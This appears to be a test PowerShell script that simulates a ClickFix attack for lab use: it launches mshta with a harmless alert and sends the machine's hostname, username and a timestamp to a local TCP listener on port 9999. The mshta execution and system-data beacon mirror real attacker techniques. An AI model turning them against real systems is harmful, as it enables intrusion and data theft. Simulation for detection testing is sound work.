# Test PowerShell script for ClickFix simulation
# This script simulates the payload execution and sends data to the TCP listener

Write-Host "🚀 Executing ClickFix payload simulation..."

# Execute the mshta command (this is what would normally run)
try {
    cmd /c 'mshta "javascript:alert(''ClickFix Payload Executed'');close()"'
    Write-Host "✅ MSHTA command executed"
} catch {
    Write-Host "❌ Error executing MSHTA command: $_"
}

# Send data to the TCP listener on port 9999
try {
    $client = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 9999)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    $message = "ClickFix payload executed on $hostname by $username at $timestamp"
    
    $writer.WriteLine($message)
    $writer.Flush()
    $writer.Close()
    $client.Close()
    
    Write-Host "✅ Data sent to TCP listener successfully"
} catch {
    Write-Host "❌ Error sending data to TCP listener: $_"
}
